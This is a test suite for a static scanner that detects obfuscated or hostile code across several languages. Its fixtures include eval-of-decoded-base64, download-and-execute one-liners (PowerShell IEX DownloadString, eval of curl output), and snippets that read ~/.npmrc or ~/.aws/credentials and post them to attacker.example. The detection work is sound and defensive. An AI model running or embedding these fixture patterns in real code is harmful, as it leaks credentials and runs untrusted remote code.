/**
 * Layer B — parameterized AST detectors driven by per-language configs.
 *
 * These detectors materialize a tree-sitter parse and look for shapes like
 * "decoder feeds a dynamic-exec sink". Per-language config drives the
 * function names and module paths. The tests below exercise the same shape
 * across multiple languages to confirm parameterization works.
 *
 * Rule IDs covered (per-language suffix is appended by the engine):
 *   obf.decode-then-exec.<lang>
 *   obf.dynamic-exec-with-non-literal.<lang>
 *   obf.network-then-exec.<lang>
 *   obf.deserializer-untrusted.<lang>
 *   obf.suspicious-io-cluster.<lang>
 *   obf.string-array-decoder.<lang>
 *   obf.shell-with-untrusted-input.<lang>
 *   obf.library-load-non-literal.<lang>
 */

import { describe, expect, it } from "vitest";
import { scan } from "@obfuscan/core";
import { virtualFiles, silentOptions } from "../helpers/matchers";

// ─── decode-then-exec ──────────────────────────────────────────────────────

describe("Layer B: decode-then-exec", () => {
  it("JavaScript: eval(atob('...'))", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.js": `eval(atob("Y29uc3QgeCA9IDE7"));\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("JavaScript: Function(Buffer.from(b64,'base64').toString())()", async () => {
    const src = `new Function(Buffer.from("Y29uc3QgeCA9IDE7", "base64").toString())();\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("Python: exec(base64.b64decode('...'))", async () => {
    const src = `import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("Python: exec(zlib.decompress(...).decode())", async () => {
    const src = `import zlib\nexec(zlib.decompress(b"x\\x9c\\x03\\x00\\x00\\x00\\x00\\x01").decode())\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("PowerShell: IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))", async () => {
    const src = `IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($payload)))\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.ps1": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("Bash: eval $(echo ... | base64 -d)", async () => {
    const src = `eval "$(echo ZWNobyBoaQ== | base64 -d)"\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.sh": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("PHP: eval(base64_decode('...'))", async () => {
    const src = `<?php\neval(base64_decode("ZWNobyAxOw=="));\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.php": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.decode-then-exec");
  });

  it("does NOT flag eval with a string literal (different rule)", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.js": `eval("var x = 1");\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.decode-then-exec");
  });

  it("does NOT flag base64 decode that is NOT fed to a sink", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.js": `const decoded = atob("aGVsbG8=");\nconsole.log(decoded);\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.decode-then-exec");
  });
});

// ─── dynamic-exec with non-literal ─────────────────────────────────────────

describe("Layer B: dynamic-exec-with-non-literal", () => {
  it("JS: eval(variable)", async () => {
    const src = `function go(s) { eval(s); }\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.dynamic-exec-with-non-literal");
  });

  it("JS: new Function(arg)", async () => {
    const src = `function go(s) { new Function(s)(); }\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.dynamic-exec-with-non-literal");
  });

  it("Python: exec(s) where s is non-literal", async () => {
    const src = `def go(s):\n    exec(s)\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.dynamic-exec-with-non-literal");
  });

  it("Ruby: instance_eval(s)", async () => {
    const src = `def go(s)\n  instance_eval(s)\nend\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.rb": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.dynamic-exec-with-non-literal");
  });

  it("does NOT flag eval(\"<literal>\")", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.js": `eval("1 + 1");\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.dynamic-exec-with-non-literal");
  });

  it("does NOT flag a TypeScript class constructor", async () => {
    const src = `
class Scanner {
  private onStatus: (update: ScannerStatusUpdate) => void;

  constructor(onStatus: (update: ScannerStatusUpdate) => void) {
    this.onStatus = onStatus;
  }
}
`;
    const { input, fileResolver } = virtualFiles({ "src/scanner.ts": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.dynamic-exec-with-non-literal");
  });
});

// ─── network-then-exec ─────────────────────────────────────────────────────

describe("Layer B: network-then-exec", () => {
  it("JS: eval(await (await fetch(url)).text())", async () => {
    const src = `async function go(url) {\n  eval(await (await fetch(url)).text());\n}\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.network-then-exec");
  });

  it("Python: exec(requests.get(url).text)", async () => {
    const src = `import requests\nexec(requests.get(url).text)\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.network-then-exec");
  });

  it("PowerShell: IEX (New-Object Net.WebClient).DownloadString($url)", async () => {
    const src = `IEX (New-Object Net.WebClient).DownloadString($url)\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.ps1": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.network-then-exec");
  });

  it("Bash: eval \"$(curl -s $url)\"", async () => {
    const src = `eval "$(curl -s $URL)"\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.sh": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.network-then-exec");
  });

  it("blocks on network-then-exec (high severity)", async () => {
    const src = `eval(await (await fetch(url)).text());\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toBlock("obf.network-then-exec");
  });

  it("does NOT flag a plain TypeScript fetch call", async () => {
    const src = `
class ManifestLoader {
  constructor(private manifestUrl: string) {}

  async load() {
    const response = await fetch(this.manifestUrl, { cache: 'no-store' });
    return response.json();
  }
}
`;
    const { input, fileResolver } = virtualFiles({ "src/loader.ts": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.network-then-exec");
    expect(result).toNotFlag("obf.dynamic-exec-with-non-literal");
  });
});

// ─── deserializer-untrusted ────────────────────────────────────────────────

describe("Layer B: deserializer-untrusted", () => {
  it("Python: pickle.loads(payload) — untrusted", async () => {
    const src = `import pickle\ndef go(blob):\n    return pickle.loads(blob)\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.deserializer-untrusted");
  });

  it("Ruby: Marshal.load(io)", async () => {
    const src = `def go(io)\n  Marshal.load(io)\nend\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.rb": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.deserializer-untrusted");
  });

  it("PHP: unserialize($_POST['x'])", async () => {
    const src = `<?php\nunserialize($_POST["x"]);\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.php": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.deserializer-untrusted");
  });

  it("does NOT flag JSON.parse — that's a safe deserializer", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.js": `function go(s) { return JSON.parse(s); }\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.deserializer-untrusted");
  });
});

// ─── suspicious-io-cluster ─────────────────────────────────────────────────

describe("Layer B: suspicious-io-cluster", () => {
  it("Node: reads ~/.npmrc and posts it", async () => {
    const src = `
      const fs = require("fs");
      const os = require("os");
      const data = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
      fetch("https://attacker.example/c", { method: "POST", body: data });
    `;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.suspicious-io-cluster");
  });

  it("Python: reads ~/.aws/credentials and posts via requests", async () => {
    const src = `
import os, requests
with open(os.path.expanduser("~/.aws/credentials")) as f:
    requests.post("https://attacker.example/c", data=f.read())
`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.suspicious-io-cluster");
  });

  it("does NOT flag reading a benign config file with no network", async () => {
    const src = `
const fs = require("fs");
const cfg = JSON.parse(fs.readFileSync("./config.json", "utf8"));
console.log(cfg);
`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.suspicious-io-cluster");
  });
});

// ─── string-array-decoder ──────────────────────────────────────────────────

describe("Layer B: string-array-decoder", () => {
  it("JS: array of base64 strings + decoder + sink", async () => {
    const arr = Array.from({ length: 32 }, (_, i) =>
      `"${Buffer.from("p" + i + "-".repeat(8)).toString("base64")}"`
    ).join(", ");
    const src = `
const _0xabc = [${arr}];
function _0xdec(i) { return atob(_0xabc[i]); }
eval(_0xdec(0));
`;
    const { input, fileResolver } = virtualFiles({ "src/loader.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.string-array-decoder");
  });
});

// ─── shell-exec ────────────────────────────────────────────────────────────

describe("Layer B: shell-with-untrusted-input", () => {
  it("Node: child_process.exec with template-string interpolation", async () => {
    const src = `
const { exec } = require("child_process");
function go(name) { exec(\`ls \${name}\`); }
`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.shell-with-untrusted-input");
  });

  it("Python: os.system with f-string", async () => {
    const src = `import os\ndef go(name):\n    os.system(f"ls {name}")\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.shell-with-untrusted-input");
  });

  it("does NOT flag a TypeScript string that builds but does not run a command", async () => {
    const src = `
const command = \`Expand-Archive -Path '\${escapedArchive}' -DestinationPath '\${escapedOutput}' -Force\`;
`;
    const { input, fileResolver } = virtualFiles({ "src/archive.ts": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.shell-with-untrusted-input");
  });
});

// ─── library-load-non-literal ──────────────────────────────────────────────

describe("Layer B: library-load-non-literal", () => {
  it("JS: require(varName)", async () => {
    const src = `function load(name) { return require(name); }\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.js": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.library-load-non-literal");
  });

  it("Python: importlib.import_module(varName)", async () => {
    const src = `import importlib\ndef load(name):\n    return importlib.import_module(name)\n`;
    const { input, fileResolver } = virtualFiles({ "src/p.py": src });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toFlag("obf.library-load-non-literal");
  });

  it("does NOT flag require with a string literal", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.js": `const fs = require("fs");\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    expect(result).toNotFlag("obf.library-load-non-literal");
  });
});

// ─── per-language rule id suffix ───────────────────────────────────────────

describe("rule id suffixing", () => {
  it("appends the language id to Layer-B rule ids", async () => {
    const { input, fileResolver } = virtualFiles({
      "src/p.py": `import base64\nexec(base64.b64decode("Zm9v"))\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    const f = result.findings.find(x => x.ruleId.startsWith("obf.decode-then-exec"));
    expect(f).toBeDefined();
    expect(f!.ruleId).toMatch(/\.python$/);
  });

  it("does NOT append a language suffix to Layer-A rule ids", async () => {
    const HIGH_ENTROPY = "Zm9vYmFyYmF6cXV4cXV1eHF1dXV4ZG9nY2F0bW91c2VlbGVwaGFudHJoaW5vY2Vyb3NoaXBwb3BvdGFtdXNNTk9QUVJTVA==";
    const { input, fileResolver } = virtualFiles({
      "src/p.py": `K = "${HIGH_ENTROPY}"\n`,
    });
    const result = await scan(input, { fileResolver, ...silentOptions() });
    const f = result.findings.find(x => x.ruleId.startsWith("obf.high-entropy-literal"));
    expect(f).toBeDefined();
    expect(f!.ruleId).toBe("obf.high-entropy-literal");
  });
});
